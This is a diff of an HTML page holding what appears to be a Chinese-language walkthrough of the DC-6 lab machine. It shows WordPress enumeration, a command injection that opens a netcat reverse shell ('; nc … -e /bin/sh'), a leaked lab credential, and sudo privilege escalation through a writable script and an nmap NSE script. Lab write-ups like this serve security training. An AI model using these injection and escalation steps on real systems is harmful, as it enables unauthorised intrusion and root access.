@@ -7545,12 +7545,12 @@
 <h2 id="dc-6">DC-6</h2>
 <p>nmap 扫描一下</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587346492252-39cae773-2756-4bd5-8e3d-b998d20fd91f-433912.png" /></p>
-<p>vim /etc/hosts
+<p>vim /etc/hosts<br />
 加上 192.168.149.164  wordy</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587346643300-1c3c581f-65fe-4131-95cb-51f3391a81c8-528101.png" /></p>
 <p>访问 80 端口，是一个 wordpress</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587346759838-df2277dd-5877-4f8f-8cf9-b209f7b59aca-544560.png" /></p>
-<p>wpscan 扫描一下，发现几个用户名
+<p>wpscan 扫描一下，发现几个用户名<br />
 <code>wpscan --url http://wordy -ru</code></p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587363531699-cbc6d1fe-5a47-4e9b-9d9f-f341c9dd0564-447823.png" /></p>
 <p>根据作者善意提醒，制作一份密码字典</p>
@@ -7565,22 +7565,22 @@
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587366261429-a5a7ece2-fc58-468c-bf49-e05ed5e51b85-306747.png" /></p>
 <p>nc 来拿一个 shell 把，kali 里面 nc -lp 6666</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587366422727-35eb9f72-1e74-4de0-8537-c56d104a71a9-034548.png" /></p>
-<p>访问的时候加上
+<p>访问的时候加上<br />
 <code>; nc 192.168.149.141 6666 -e /bin/sh</code></p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587366470235-ceb7073e-d40d-47e7-81b1-793f7897acf6-191036.png" /></p>
 <p>python -c "import pty;pty.spawn('/bin/bash')" 开启一个交互 shell</p>
 <p>在 mark 的目录下找到了一个用户名和密码 graham : GSo7isUM1D4</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587366690468-edd8bdf4-bc32-44de-9414-8a742b98e684-773563.png" /></p>
-<p>这个账户可以直接 ssh 登进来 ssh graham@192.168.149.164
+<p>这个账户可以直接 ssh 登进来 ssh graham@192.168.149.164<br />
 登陆以后，sudo -l 发现一个不需要密码就可以用的</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587366874661-5100dd7c-9f0f-4259-9f38-9718c7d1a3fc-311292.png" /></p>
 <p>在后面追加一个 /bin/bash，这样运行的时候就能拿到 jens 的 shell 了</p>
-<p><code>echo "/bin/bash" &gt;&gt; /home/jens/backups.sh</code>
+<p><code>echo "/bin/bash" &gt;&gt; /home/jens/backups.sh</code><br />
 <code>sudo -u jens /home/jens/backups.sh</code></p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587367972600-a5abbb09-c3b0-4a33-9244-a55d65abd126-336252.png" /></p>
 <p>这次是 nmap，可以写个脚本，让 nmap 来执行然后拿到 shell</p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587368068411-3684a88b-8431-4266-b071-48cff6e716f3-609569.png" /></p>
-<p><code>echo 'os.execute("/bin/sh")' &gt; shell.nse</code>
+<p><code>echo 'os.execute("/bin/sh")' &gt; shell.nse</code><br />
 <code>sudo nmap --script getroot.nse</code></p>
 <p><img alt="image.png" src="../img/551828_vx44wo9s0m8gb89d/1587368425862-0a626504-1f9b-464e-8cb1-06f65f3db949-799453.png" /></p>
 <blockquote>
